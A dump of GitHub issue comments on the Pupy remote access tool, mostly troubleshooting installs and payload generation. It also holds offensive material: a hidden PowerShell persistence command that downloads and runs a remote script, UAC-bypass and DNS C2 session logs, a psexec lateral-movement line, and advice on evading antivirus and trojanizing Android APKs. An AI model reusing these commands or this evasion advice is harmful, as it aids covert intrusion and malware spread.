occurred:\nroot@7b6a7a401fad:/opt/pupy# ./pupysh.py -l obfs3 127.0.0.1:4343\n2018-09-08 09:44:08,439| Generating credentials to /opt/pupy/crypto/credentials.py\n................................................................++\n............................................++\n.........................................................................................................................................................................................++\n.......................++\n...............++++++\n..................................++++++\n......................++++++\n................++++++\n.........++++++\n..............++++++\n.............................++++++\n..++++++\n..........++++++\n..........++++++\n[I] Credentials password:\n2018-09-08 09:44:18,498| Cannot read wireshark manuf database\n2018-09-08 09:44:18,662| Loading module scapy.layers.netflow\nTraceback (most recent call last):\n  File \"/usr/local/lib/python2.7/dist-packages/scapy/main.py\", line 121, in _load\n    mod = importlib.import_module(module)\n  File \"/usr/lib/python2.7/importlib/init.py\", line 37, in import_module\n    import(name)\n  File \"/usr/local/lib/python2.7/dist-packages/scapy/layers/netflow.py\", line 86, in \n    class NetflowRecordV5(Packet):\n  File \"/usr/local/lib/python2.7/dist-packages/scapy/layers/netflow.py\", line 101, in NetflowRecordV5\n    ByteEnumField(\"prot\", IP_PROTOS[\"tcp\"], IP_PROTOS),\n  File \"/usr/local/lib/python2.7/dist-packages/scapy/dadict.py\", line 38, in getitem\n    return getattr(self, attr)\nAttributeError: DADict instance has no attribute 'tcp'\n        _____                    _       _ _\n\n    |  _  | _  _  | | | | |    \n|||  |   | | | . | | |  | -|   | -_| | |  |||\n           |_|  ||  |  |  |||_||||\n                     |_| |___|\n               v1.8 (Aug 2018)\n\nBleeding edge: https://github.com/n1nj4sec/pupy\nThe usage of this software to access any system,\n  service, or network without the owner's consent is\n  expressly forbidden.\nPlease follow https://www.eccouncil.org/code-of-ethics/\nGood luck!\n[] IGDClient enabled\n[] Listen: obfs3: 127.0.0.1:4343\n jobs\n...\nIt would be better to add requirement list in your first page, What's your idea @n1nj4sec ?. ",
    "glides": "No offense, but you're going to constantly have questions if you're struggling with that part. That's basic networking and has nothing to do with the code.\nIf you're trying to get into IT sec/Pen Testing but are very novice, try checking out Metasploit Unleashed for a reference guide for beginners and maybe brush up on some basic networking concepts. . ImportError: No module named rpyc.core\nYou're missing some dependencies.. The default behavior is to interactive with all connected agents at once. You can use the 'sessions' command to specify which agent you which to talk to with 'sessions -i X', X being the agent ID you want to work with.\nYou can also filter which agents you communicate to with the 'run' command:\n\n\nrun -h\nusage: run [-h] [-1] [-o OUTPUT] [-f ] [-b]  ...\n\n\nRun a module on one or multiple clients\n...\noptional arguments:\n  -h, --help            show this help message and exit\n  -1, --once            Unload new deps after usage\n  -o OUTPUT, --output OUTPUT\n                        save command output to file.%t - timestamp, %h - host,\n                        %m - mac, %c - client shortname, %M - module name, %p\n                        - platform, %u - user, %a - ip address\n  -f , --filter \n                        filter to a subset of all clients. All fields\n                        available in the \"info\" module can be used. example:\n                        run get_info -f 'platform:win release:7 os_arch:64'\n  -b, --background      run in background\n. You could specify a single domain and use DNS round robin or failover techniques from that side.\nThis would accomplish half of your goal at least. The remaining problem would be if the domain becomes inaccessible. This exists and it works.\nhttps://github.com/n1nj4sec/pupy/issues/647#issuecomment-453622000. We'd need to see the entire output leading up to that error to more accurately troubleshoot.\nHowever, try 'apt-get install python-dev' or 'sudo apt-get install python-dev' is where I would start. It's not because your CPU is old - it's because you're most likely missing some dependencies . The code to generate the exe templates is in client/source. Customize it however you want.\nIf you have a binary already generated but want to bypass AV, look at Veil Evasion.\n. Well - you never said you were having trouble generating the templates. You just said you wanted to use a custom exe and ask if someone could help. I think my answer addresses your original post.\nThis is an unstable branch, you're going to be running into ALL kinds of stability issues and errors. You'll need to troubleshoot them. And if you want others to help troubleshoot them you need to start adding details to your help requests. What OS are you building from? What steps did you take already to fix the issue? etc.\nI'm not sure how much time @n1nj4sec has for this project but his commits and comments have been coming in slower lately.\nYou could always take a look at @alxchk's fork which uses docker to build the templates and that (for the most part) is working out of the box: https://github.com/alxchk/pupy (keep in mind, his branch is very much a WIP as well). No worries.\nIf you clone @alxchk's fork you'll want to run:\n./create-workspace.py -P {path to pupy dir} {new workspace path}\nMight need to make a few tweaks....for instance, I had to change:\nsubprocess.check_call(['build-docker.sh'], env=env) \nto\nsubprocess.check_call(['./build-docker.sh'], env=env)\nAdd ~/.local/bin to your path:\nexport PATH=$PATH:/root/.local/bin. That's a pip error. Take a look here: https://github.com/pypa/pip/issues/5240\nIf you upgraded pip to 10 - that might be the issue.. Did you guys search?\nFrom @n1nj4sec in another issue... \"made an example a few times ago of how I would make a web interface with websockets interact with pupy (using tornado and angular). The code is available in the 'web' branch on the git https://github.com/n1nj4sec/pupy/tree/web\nYou can look in particular the directory pupy/websrv/* for the code which is pretty minimalist. the PupyWebServer class acts as a replacement for the command line class pupylib.PupyCmd.PupyCmd which interact with PupyServer. In my example you can start the web server with \"./pupysh.py --web\"\nThe code is just a PoC so you will need to merge or rewrite it from scrach from the master (or preferably the unstable branch).\". Install the JDK\njarsigner is in %JAVA_HOME%\\bin\\jarsigner. Paste the entire error. I believe it's looking for the credential.py file and unable to find it, but I need to see the entire output.\nSide note: if you're running pupysh I assume the install is done? The title confuses that.. While we wait for M2Crypto to patch\nYou can modify PupyCredentials.py this line in two spots:\ncert.add_ext(X509.new_extension('subjectKeyIdentifier', cert.get_fingerprint()))\nwith\ncert.add_ext(X509.new_extension('subjectKeyIdentifier', str(cert.get_fingerprint()))). @currysmygod Try:\napt-get install python-m2crypto. Veil is not outdated. The last update was 12 days ago. Which method are you using, I can make non-detectable binaries all day. https://github.com/Veil-Framework/Veil\nYou could always modify the source code and recompile the binary templates, as well.. You aren't using pupygen correctly.\nhttps://github.com/n1nj4sec/pupy/wiki/Generate-payloads. The entire history of the project is able to be cloned using git from this repository.\nWhat you need to do is make a branch from the commit you want to clone. Do a little digging on how to use git and you will figure it out.. You need to enable DNSCNC in the config file so it starts when you launch pupysh.\nYou also need to have an A record and NS record setup to point to your pupysh machine. If you're behind a NAT you need to port forward 53 to pupysh on whatever port you started the DNSCNC service on.\nStatus should now show:\ndnscnc status\nPROPERTY  VALUE \nDOMAIN    c2.xxxxxxxx.io\nKEX       True \nTIMEOUT   90s \nSESSIONS  TOTAL=1 DIRTY=0 \nRECURSOR  8.8.8.8 \nPOLL      30s \nDNS PORT  53 \nLISTEN    0.0.0.0\nDisplay dnscnc sessions with 'dnscnc sessions'\ndnscnc sessions\nP  NODE          SESSION   OS           ONLINE  EXTERNAL IP    IDLE  DURATION  BOOTED                     CMDS\n0     0a0027000011  3c341ecf  Windows/x64  Y       xx.xx.xx.158  0s    91s       Thu Jan 10 17:22:29 2019s  0\nYou can send exec/pyexec to these sessions - but to take advantage of the other modules in pupy you need to have it connect in a more traditional way like this:\ndnscnc -n 0a0027000011 connect -c 10.0.0.75 -p 4444 -t ssl\n[+] Schedule connect 1 known nodes\n[*] Session 2 opened (glides@DEATHSTAR) (c2.xxxxxxx.io <- 10.0.0.139:62813)\nNow you can interact with the session normally, and disconnect it when done.. You're missing a dependency. To fix it all you need to do is install it.\nHowever, if you followed the wiki|Installation you should already have it installed.. \"Please do not run as root.\"\nIssues should be open to report bugs. Not for support with basic usage, as most of the issues I see you opening are...\nIf you're looking for a well polished post exploitation tool that isn't going to require you to invest some time into getting it going and is well documented. Check out Cobalt Strike and pay for the work.. That scriptlet appears to be out of date.\nBack in Nov persistence methods were updated to be managed winpwnage, but the script wasn't updated.\nhttps://github.com/n1nj4sec/pupy/commit/8e223560ffb7ac707dd0d9d8e36a56b517ce202b. I tried to replicate and found that I can successfully get an interactive_shell from med/high/system integrity levels under certain conditions.\nManually executing the client binary allows for an interactive_shell while elevated and unelevated.\nIf you get system with the manually elevated client, I can get an interactive_shell from connection as well.\nIf I execute the client binary unelevated, and simply restart it as admin \"bypassuac -r\" I cannot get an interactive_shell from that connection. And if I elevate to system from that client, I cannot get an interactive_shell from there either. \nI have not been able to test other ways to elevate but figured that might be useful in troubleshooting. . @alxchk \nI just pulled a fresh copy from alxchk/pupy and compiled the payload templates via docker. I get the same results. There is no additional output from pupysh while setting logging to info. Also, I tried typing just 'shell'\nSometimes the failed attempt would result in an error flashing in the console (pupysh). I managed to screenshot: https://imgur.com/a/7fllY3e\nThe other times an error msgbox would pop up on the client machine: https://imgur.com/a/k2Eu7Iq\nAlso, I confirmed this happens anytime I tried with a connection received from the bypassuac module (I'd specified the exe that I had just compiled instead of using powershell). Again, it works fine when you elevate the exe manually (right clicking and starting as admin) . > Also, what is the system and bypassuac method?\nWindows 10. Bypass methods I've tested 2,4,10 and restart as admin. \n\nYou can try to duplicate or migrate module after bypassuac, it may work then.\n\nGood suggestion; however, when attempting to duplicate the client machine pops-up with https://imgur.com/a/tbCgzyl and pupysh's output acts like nothing is wrong and that I should expect a new connect. This only happens to sessions created with bypassuac, again manually elevating grants the process the proper privs and  duplicate,  migrate, and impersonate all work fine then. \nI normally have other less triggery ways to elevate in a real-world scenario. Just thought I would try to reproduce the issue and found the behaviour to be odd. Am I using bypass methods on a target that's been patched? Pupy reports the sessions as High Integrity, but they are lacking some privs.. @alxchk \nUpdating WinPwnage to the latest resolves all my issues I raised here and adds new bypass methods. \nhttps://github.com/rootm0s/WinPwnage. Using your branch and after updating WinPwnage, it's much more stable.\nHowever, I can consistently continue to reproduce the issue by using UAC bypass methods 10 and 16. Using method 15 is super clean, method 4 leaves a prompt behind, but works.\nWhen using method 10, I notice my session connects back before I get the notice my proc has spawn. This doesn't happen using the other working methods.\n```\n\n\nbypassuac -m 10 -e \"C:\\Users\\x\\Desktop\\client_x64.exe\"\n[%] Using remote cmd (C:\\Users\\x\\Desktop\\client_x64.exe)\n[%] Bypass uac could take few seconds, be patient...\n[%] Attempting to run id (10) configured with payload (C:\\Users\\x\\Desktop\\client_x64.exe)\n[+] Successfully created Default key containing payload (C:\\Users\\x\\Desktop\\client_x64.exe)\n[+] Successfully created DelegateExecute key\n[*] Session 4 opened (x@DEATHSTAR) (('10.0.0.75', 4444) <- 10.0.0.139:50790)\n[%] Disabling file system redirection\n[+] Successfully disabled file system redirection\n[+] Successfully spawned process (C:\\Users\\x\\Desktop\\client_x64.exe)\n[+] Successfully cleaned up, enjoy!\nsessions -i 4\n[+] Default filter set to 4\nshell\n[+] Start new shell\n[+] Shell closed\n\n\n```\nLet me know if I can assist. I agree something is corrupted, but it's somewhat inconsistent...appears partially functioning, and impacts more than just the shell module.. ",
    "ndragon798": "Try running sudo -H pip install -r requirements.txt  make sure you are in the folder with the requirements file. . I would suggest reading this http://www.compiletimerror.com/2014/12/android-autostart-app-after-boot-with.html and having it auto start with the phone.. I added a pull request for this a while ago. #419 . ",
    "k4pak": "root@kali:~/pupy/pupy# sudo -H pip install -r requirements.txt\nDirectory 'external/pykcp' is not installable. File 'setup.py' not found.\n. ",
    "Raemey": "there is a small bug in the registry persistence code that keeps it from populating the correct registry value data. I've noted that as another issue. . ",
    "nano727": "I have the same problem. Please, fix this.. ./pupygen.py -h\nusage: pupygen.py [-h]\n                  [-f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}]\n                  [-O {android,windows,linux}] [-A {x86,x64}] [-S] [-o OUTPUT]\n                  [-D OUTPUT_DIR] [-s SCRIPTLET] [-l] [-E] [--no-use-proxy]\n                  [--randomize-hash]\n                  [--oneliner-listen-port ONELINER_LISTEN_PORT]\n                  [--debug-scriptlets] [--debug] [--workdir WORKDIR]\n                  [{bind,auto_proxy,dnscnc,connect}] ...\nGenerate payloads for windows, linux, osx and android.\npositional arguments:\n  {bind,auto_proxy,dnscnc,connect}\n                        Choose a launcher. Launchers make payloads behave\n                        differently at startup.\n  launcher_args         launcher options\noptional arguments:\n  -h, --help            show this help message and exit\n  -f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}, --format {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}\n                        (default: client)\n  -O {android,windows,linux}, --os {android,windows,linux}\n                        Target OS (default: windows)\n  -A {x86,x64}, --arch {x86,x64}\n                        Target arch (default: x86)\n  -S, --shared          Create shared object\n  -o OUTPUT, --output OUTPUT\n                        output path\n  -D OUTPUT_DIR, --output-dir OUTPUT_DIR\n                        output folder\n  -s SCRIPTLET, --scriptlet SCRIPTLET\n                        offline python scriptlets to execute before starting\n                        the connection. Multiple scriptlets can be privided.\n  -l, --list            list available formats, transports, scriptlets and\n                        options\n  -E, --prefer-external\n                        In case of autodetection prefer external IP\n  --no-use-proxy        Don't use the target's proxy configuration even if it\n                        is used by target (for ps1_oneliner only for now)\n  --randomize-hash      add a random string in the exe to make it's hash\n                        unknown\n  --oneliner-listen-port ONELINER_LISTEN_PORT\n                        Port used by oneliner listeners ps1,py (default: 8080)\n  --debug-scriptlets    don't catch scriptlets exceptions on the client for\n                        debug purposes\n  --debug               build with the debug template (the payload open a\n                        console)\n  --workdir WORKDIR     Set Workdir (Default = current workdir)\nWhere is line about dll payload?. ",
    "xp4xbox": "There are also other methods of making it launch at startup, if you want to do it manually: http://www.megasecurity.org/Trojaninfo/auto_start_methods.htm. ",
    "jxlx": "Solved, was a port issue. thanks!. ",
    "BTone": "The path specified by -e is a local path, not a remote path! The module will then upload the executable to the target.. ",
    "rokups": "I started looking at the code more closely and i see pupy has variable reconnect times, though it would still be good to make that part more configurable. I started coding and this is what i got so far is passing a string command line parameter to pp.y which describes reconnect pattern.\n./pp.py --reconnect-pattern=\"120, 0.5, 1;  320, 3, 5;  15, 30\" - defines current reconnect scheme. Up to 120 attempts sleep between 0.5s and 1s. Up to 320 reconnects sleep between 3s and 5s. Above 320 reconnects sleep between 15s and 30s.\nPattern structure should be pretty obvious here: \", , ; [...]\", If max_attempt is not specified then it is a sleep range for all remaining tries. Not specifying sleep times for all remaining tries makes ./pp.py exit. I hope it is not too complex? \n./pp.py --reconnect-pattern=\"3, 10, 30\" would try reconnecting up to 3 times and exit.\nPlease check out the code. This is not a complete solution. Is this an acceptable approach? Should i work on it further? Have any comments on how it should be done instead? . Fair enough ;) My proposal was rather complex, i implemented it as --reconnect-delay 120 0.5 1 --reconnect-default 15 30 which translates to \"sleep between 0.5 and 1s when try count is less or equal to 120\". After 120 tries it would sleep between 15s and 30s. Multiple --reconnect-delay parameters may be used. Maybe this is bit more proper and less overkill? ;). > It's more fat than python2\nCitation needed. Besides they are both fat and at this point difference is negligible.\n\nAlso no profit.\n\nProper unicode support and fstrings alone are great profit. How about language that is being maintained, bugs are being fixed and libraries for it being maintained? High profile projects are already dropping support for py2, it is the dead-end.. ",
    "reillychase": "bump ?. yes it can be closed thanks ninja. Thanks ninja! I'll let you know how it goes. nevermind, the args need to be in the right order IE python pupygen.py bind --port 1337 will work. Now how do i connect to the port the payload binded to? python pupysh.py doesnt have a bind option?. makes sense of course since it is the one connecting not binding (duh) thanks!. ",
    "AguNnamdi": "On kali linux.. please help\nfailed to build m2crypto\nerror: command 'x86_64-linux-gnu-gcc' failed with exit status 1\n----------------------------------------\n\nCommand \"/root/Desktop/PUPY/pupy_env/bin/python -u -c \"import setuptools, tokenize;file='/tmp/pip-build-9dk3XO/m2crypto/setup.py';f=getattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, file, 'exec'))\" install --record /tmp/pip-4jNJWN-record/install-record.txt --single-version-externally-managed --compile --install-headers /root/Desktop/PUPY/pupy_env/include/site/python2.7/m2crypto\" failed with error code 1 in /tmp/pip-build-9dk3XO/m2crypto/. ",
    "thechiefalone": "i have same problem on ubuntu 16.04 \nCommand \"/usr/bin/python -u -c \"import setuptools, tokenize;file='/tmp/pip-build-ts2sH2/m2crypto/setup.py';f=getattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, file, 'exec'))\" install --record /tmp/pip-r7EED4-record/install-record.txt --single-version-externally-managed --compile\" failed with error code 1 in /tmp/pip-build-ts2sH2/m2crypto/\n. ",
    "boff64": "I can help . Can it migrate in android processes? This project has a lot of potentials, can it be persistent on android right now without root? . ",
    "CyberSecGuy": "Any update to this?. ",
    "AkelMaister": "Hm... i fix my issue.\nFor this i reboot client PC and after reboot i get another error: \nrun -f 1 screenshot\nWARNING:root:Path contains unsafe binary objects: libmss.so\n[-] Couldn't find package: mss\nAfter that, i upgrade mss to version 2.0.22 (latest v2 version), then try again and... FIX!. ",
    "danvollans": "Have tested this on a local environment, comparing a random high source port mount failure (in previous version of forward.py and pyuvproxy.py) to the patched verions with manually specified low source port mount success.  This patch clears up my issue.  I appreciate the extremely fast and clean patch.. ",
    "Hacksawfred3232": "Could you please specify the error you are getting with this? I think i may know the problem with this but i need to be sure.. Aha! That was what i was expecting. From when i tried this piece of software myself, i learnt that pupygen.sh has a structure to its command that you need to follow. Let me put in the note very quickly that i made just to remind myself.\nThis is the structure used for the pupygen command\n./pupygen <options> <launcher type> <launcher type augments>\nDO NOT MIX UP THE STRUCTURE FOR THIS COMMAND! OTHERWISE THE PAYLOADS FROM THIS PROGRAM WILL FAIL!\nNOTE THAT SCRIPTLETS BELONG TO OPTIONS! NOT THE LAUNCHER TYPE ARGUMENTS!\nSo the command you got right now:\n./pupygen.py connect --host 192.168.178.1:7777 -s keylogger\nwould be become this:\n./pupygen.py -s keylogger connect --host 192.168.178.1:7777\nBut note this is still flawed because previous testing showed a bug that required the arguments to be all one \"word\" as per arguments for the connect payload. And you have not included a transport for the connect payload to use. So the command would be really this:\n/pupygen.py -s keylogger connect --host=192.168.178.1:7777 -t=ssl\nHope this helps. Might as well ping @n1nj4sec to let him know of this so he could at least add the note that i made.. This is worrying. Certainly worrying.\nIf @quentinhardy and @n1nj4sec are still working on the pupy project, you may have trouble working on a cross-apk compiler. From my research and experiments, modifying only the byte code to run the payload is impossible. You would need to decompile the apk file first using dex2jar and apktool to get the source code, then modify the code to run said payload. Whoever programmed the verifier is smart. But i am sure we can be smarter than them.\nIf anyone wants to continue this adventure, here is some more tools that can help. \nApktool:\nhttps://ibotpeaches.github.io/Apktool/\nDex2jar\nhttps://github.com/pxb1988/dex2jar\n(You may also want to get this tool: http://jd.benow.ca/ )\nP.S.\nBTW, @quentinhardy is your code the up to date version? Cause i am using the code from @n1nj4sec's repo.. ",
    "s1st3r": "A lot of people have already started using these payloads and a lot of them have \"stupiditily\" uploaded them to virustotal coz they are jerks!, and so pupy will be caught by any AV out there by now.\nMaking the payload FUD has two steps\n\n\nRewrite the whole code, into something new, by this i mean change the libs, functions and variables to something new.\n\n\nBuild a crypter that will clean your payloads and encrypt them.\n\n\nDont be a script kiddie.. Amazing... you close the query without even wondering what i really asked? Did you even read what i requested?\ncheck...\nif you already have a session to a windows machine, and you just do \nrun windows/network/impacket/psexec.py administartor:password123 @TargetInsideTheNetwork cmd.exe\nAnd then you have a shell from remote in the network. Sorry guys, this was scapy module pip error, i removed pip and rebooted,ready to test new pupy.\nKindly close it. I keep having this problem on an Ubuntu box, but when i reboot it works okay, is this a scapy issue???. maybe your exe is being caught by Antivirus, try change a few things in the framework, you might bypass somewhere. Otherwise disable AV.. Best way is to upload your own code.exe to target box, and have it write to disk, in a hidden folder, then when target is online, upload and delete.. Read the source code and learn how empire works too.  Also remember Pupy is opensource RAT by now the AVs could be catching up on all its tricks, u will need to do a lot of changes on the code.. Negative, \nUnless GUI, like QT. pyinstaller is for WinApi.\nDoes WinApi apply to MacOSX???. don't install m2crypto and scapy via pip, try do it through yum or apt, depending on the OS. I have seen this error a couple of times during class Labs.. @glides I just  did, i have found the first pages of commits. for those who wonna look at it and study, check out here\nhttps://github.com/n1nj4sec/pupy/commits/unstable?after=aa95dc42ff131f291fed229029c545203ad5932d+1749. @alxchk is doing a good job, @n1nj4sec got married he slowed down with devs, LOL! @alxchk can do wonders, even recreate the sources if he is good in C/C++. And try to hide that IP from Ivory Coast.... ",
    "killercoderz4": "Please how can I I enable persistence and keyloggers via scriptlet for my power shell one liner. I have built the one liner works great on my virtual machine but when I restart I loose session. Any command line snippet would help. Please how can I I enable persistence and keyloggers via scriptlet for my power shell one liner. I have built the one liner works great on my virtual machine but when I restart I loose session. Any command line snippet would help. How do you handle persistence. I implemented it as scriptlet but when I restart it doesn't work , my method is registry. ok , i have been trying to get at least some basic form of persistence but once i restart vm boom it gone. i used this scriptlet  run persistence -c \"powershell.exe -w hidden -noni -nop -c \\\"iex(New-Object System.Net.WebClient).DownloadString('http://:443/index.html')\\\"\" -m registry. at the ip address tag i put ip and bam it compiles and works but here is the challenge once i restart my vmare evrything disappears no session. i know i have alot to learn just had 3 days experience on pupy prject. can you please share any way i can get at least some basic persistence working , so i can evolve on it as i get deeper.Thanks alot as i await your feedback. to make matters worse i nolonger get any session from my vm. i send  my bat file and run it\nit get to here \n[+] Started http server on 0.0.0.0:443 \n[+] waiting for a connection ...\nip address - - [06/Jan/2018 09:35:35] \"GET /index.html HTTP/1.1\" 200 -\n[+] [Stage 1/2] Powershell script served !\nip address- - [06/Jan/2018 09:35:38] \"GET /tata.html HTTP/1.1\" 200 -\n[+] remote script is running in a x64 powershell process\nit stays there for almost an hour it meant to get to stage to and shell started but it doesnt. it was working flawlessly yesterday but everything is just bad today. i dint change anything same old configurations.it seems this tool still has lots of stability issues. any tip would be appreciated\n  . @xuxuedong. Thanks for the tip, but this process require I setup nssm and install the payload service. But is there away to add it as a scriptket during payload build so I have unattended or automatic persistence which doesn't need me running commands after staging the payload in my VMware.thanks. ",
    "berney": "Ah I didn't realise there was more options (in the run part rather than the shell/interactive_shell part). Thanks that should be it.. @ClearGateTeam start ttyrec before you start pupy, that will record everything you do.\n@alxchk Thanks for this feature and explaining it a bit more for me. I have used it found it working as desired.. ",
    "474172261": "well,I seem to understand why this happened,because python looking for modules with relative search first in python 2.x,so it find network/launcher/utils first.and then search utils again.. I added \"utils\" modules into compressed libraries.I figure out that this result  is not a issue because of pythons's import mechanism.Thanks for your comment! :). ",
    "my7hical": "Nevermind. I fixed this by first doing sudo apt-get install libssl-dev after doing so, I did pip install --user --upgrade -r requirements.txt.. For 1 it was an incorrect format, but now when I try to make a android payload, it doesnt seem to be a apk file. Whats wrong?. For 3, I was able to fix it by simply removing the file. I was the one who added it because it seemed to have had a error earlier that it was missing. Removing it fixed it.. I'm going to assume that for no. 2, the issue was that it didn't receive the correct parameters, so it just created them. And so that was just the targets file. . ",
    "amirfateh30": "\nHello Reilly !\nYou are welcome if you want to help building a GUI for pupy !\nSo I made an example a few times ago of how I would make a web interface with websockets interact with pupy (using tornado and angular). The code is available in the 'web' branch on the git https://github.com/n1nj4sec/pupy/tree/web\nYou can look in particular the directory pupy/websrv/* for the code which is pretty minimalist. the PupyWebServer class acts as a replacement for the command line class pupylib.PupyCmd.PupyCmd which interact with PupyServer. In my example you can start the web server with \"./pupysh.py --web\"\nThe code is just a PoC so you will need to merge or rewrite it from scrach from the master (or preferably the unstable branch). I used tornado and angular for the PoC but I'm not particularly familiar with them so you are welcome to use flask and VueJS as you wish ;)\nDon't hesitate if you have any questions,\nCya\n\nHello n1nj4sec\nThanks for the help\nThe link can not be opened.. ",
    "WarrenHood": "Sorry,\nSo i built the apk payload using my local ip. And used connect... Then i run the payload on my phone ( which i am using vnc viewer through usb0 to control, so they both have the same local ip since I'm using USB tethering for the pi's internet)... Then i run pupysh.py and i just get no clients connecting but the port is both 443 on client and server...\nPlease help. i didn't change the config... Should i?\n\nPupygen\n\n\nPupysh\n\nw or netstat says no clients... I ran the app before opening pupysh and while it was open but didn't connect...\n. @n1nj4sec\n trying with http transport on 127.0.0.1 now... Still not working...\n\nAlso i tried a pure python file but it had an error about no get_modules method :\n\n. @n1nj4sec ok i will try calling it something else. ",
    "leapordcaun": "@ClearGateTeam \n./pupy_**.ps1\nWARNING: PE is not compatible with DEP, might cause issues\nis what I get, any suggestions?. Issue resolved.\nFigured it out. The service was running on ipv6 and the client was looking for an ipv4 address. Changing the ipv6 option to false resolved the issue.\nClosing.. ",
    "generatorada": "rm -rf /usr/lib/python2.7/dist-packages/OpenSSL\nrm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info\npip install pyopenssl. ",
    "Strazzom": "This needs to be merged, as it is impossible to take screenshots from the NT process. I have worked around this by migrating to explorer in a second session, but this is a less than elegant solution.. @AlessandroZ This is true, but it is not ideal to have multiple listeners connecting to the network. Each session (correct me if I am wrong) uses its own connection. That means if one were to have two sessions (SYSTEM and Admin) then there would be twice as much network traffic.\nI am not sure how hard it would be to implement, but Cobalt Strike has a feature where all privilege escalations still use the original listener for network connectivity, thereby keeping network traffic to a minimum.\nTheir description of it can be read here: https://www.cobaltstrike.com/help-smb-beacon. @AlessandroZ I have been wondering about custom packers and crypters myself. Some automated script to run a given payload or DLL through something like Veil shouldn't be that hard to implement.. Noted.\n\nBranch was created a long time ago. From that time there are 0 issues and 0 pull requests which clearly shows no future of this initiative.\n\nI disagree with this. First, it is impossible to open issues on your branch, seeing as it is a fork of the main branch. Perhaps I am mistaken, but I think you have to open issues on the main branch. This may be a misunderstanding of github on my part, but I think you might have issues if your fork allowed issues to be created. At the top of the screen, I see no \"issues\" tab.\nPerhaps this is a configuration option?\nPerhaps if it was enabled (supposing I am right), people would be inclined to submit pull requests to fix the issues reported.\nEDIT: Speaking from personal experience: I have two different issues to report, and I am not sure where they should go. I know I can report them to @n1nj4sec's branch, and that you might fix them in your branch (see: issue #619). However, this whole process strikes me as inefficient, because it would be easier to report issues to your branch, and the issues section doesn't exist.. I see you have re-enabled it. Thank you.\nEDIT: I have opened the issues in your forks issue tracker.. I might be willing to help with the more mundane maintenance tasks, such as maintaining the documentation. That is heavily dependent on whether I can make pupy generally useful though. I like the concept (python in-memory post exploitation framework), but I have some testing to do to see if I can make it work.. Where did we leave off with this? I gather that there will be some work required to merge the branches, but at the very least, could you allow @alxchk and @AlessandroZ to commit to main, @n1nj4sec?\nI propose--until the branches can be merged--that all of @alxchk's work be moved to an \"unstable\" branch on the main repo. It would at least make it easier for me, because I can't commit to alxchk's repo, and even if I could, it makes no sense to do so if I could be using this one.. I am going to close this, seeing as we got the project rolling again.. Perhaps the install for that component failed? I am testing this in the latest docker pull.\nAny idea what the last error is about?. I have narrowed it down some.\nOutput of recursive grep:\n./pupylib/payloads/py_oneliner.py:            'pupyimporter.install(debug={})'.format(str(debug)),\nIt looks like the debug parameter is null, because there is nothing after the \"=\" in the output, which means nothing is being written to that variable. Will test further and report back.. I think I \"fixed\" it.\nI changed line 34 in ./pupylib/payloads/py_oneliner.py to 'pupyimporter.install()',. This will probably break debug mode for apk generation (I assume that is what it is doing), but it at least seems to correctly output the apk.\nI will try installing it on an old android phone i have lying around to see if it actually works.\nEDIT: Saw your commit. I will have to wait for the latest docker build come out before I test it.. @alxchk So, after a hiatus I am back.\nThe umsgpack issue has been fixed.\nI will update the CLI documentation today.\nHowever, after having done a lot of testing last week, the android payload may be broken. All it seems to do is print \"Hello from Pupy!\" on the screen. It does not seem to successfully connect back to the server however, and I never get a session.\nThis may be due to incorrect firewall configuration, because an external nmap scan shows the listener port blocked. I will test this again with a Windows payload using the same parameters, and see if it can connect. If so, we know it is in fact an issue with the APK version.\nI am not sure it is an issue right now though, so I am going to close this one because 2/3 are fixed. If I can confirm that the Android payload does not work, I will open a new one.. What phone or VM are you testing this on? What version of Android is it running? What processor architecture, ARMv7 or x86?\nTo get the updated version you can either clone the repo again to get the latest commit, or wait until the next automated docker build and run docker pull alxchk/pupy:unstable to download it.\nPlease refer to the wiki for more information. Also, please report the DNSCNC problem as a separate issue.. @AlphaMufasaOmega: For stylistic and convenience reasons, please edit your existing comment rather than creating new ones in succession. Also, please put any logs or long command line output in a gist rather than pasting it directly into the comment. At the very least, use code blocks with the backticks so that it is easier to read, (for short sections, anything longer should be in a gist)\n```\nThis is an example.\nPlease replicate.\n```\nAs far as the actual issue, it looks like you might be following outdated instructions. For the most current ones, please use the Debian 9 installation wiki page as reference.\nAlso, speaking from personal experience, Qubes tends to have issues with Pupy. I would suggest testing this is a more mainstream hypervisor such as Virtualbox to verify that it is not a Qubes issue. There is a a bug that causes a VM crash on Qubes 3.2 when trying to install Pupy, for example.\nI am working on making the Docker installation (which is the recommended way to install Pupy) more convenient with Docker Compose. I have not managed to get the baremetal installation working for several months, at least on Qubes.. The issue you are talking about is documented in issue 2 on alxchk's fork. See this.\nI am currently trying to figure out if it is an issue specific to Qubes. Other people claim they have gotten it to work, so it might be Qubes specific, (assuming they were testing on something else.)\nAlso, thank you for editing your previous comments.. How exactly does one \"pass vsyscall=emulate to kernel command line\"? I am not seeing anyone saying specifically how to in the links you posted.. From the first link:\n\nIn order to activate \"vsyscall=emulate\" you need to restart the PC because this setting is only read at boot time. You also need to maker sure it is in the right place. On current Debian testing I had to add it to /etc/default/grub like this:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet vsyscall=emulate\"\n\nAlso, is there a way to detect whether it is enabled or not? I recall there being something about that in the old wiki, but the page was deleted. Output from lscpu has syscall as one of the flags, does that mean it is enabled?\nI can also confirm that the latest commit has not fixed the crashing issue.. Does pupysh itself actually work, and can you generate payloads?\nAlso, I found an old issue here talking about allowing Qubes VM to boot from their own grub bootloader. I am not as familiar with paravirtualization as I would like, but it sounds like the VMs aren't actually using their own grub config. Not sure how you would set this parameter if that is the case.\nFurther research here. It looks like PV VMs do not provide their own kernel, so config needs to happen on the Dom0 side.\nFrom the above:\n1. You can select the kernel version in VM settings;\n2. You can modify kernel options in VM settings;\n3. You can not modify any of the above from inside a VM;\n4. Installing additional kernel modules is cumbersome.\nI am trying to figure out how to accomplish item 2.. The following should allow you to enable vsyscall support for a specific VM in Qubes:\nqvm-prefs -s <vm-name> kernelopts \"nopat vsyscall=emulate\"\nThis should be run from Dom0. Please check the VM options in the Qubes manager to see if nopat is enabled on VMs in Qubes 4 (I use 3.2). It is under the advanced tab. If it is not enabled, check which kernel options are default and make 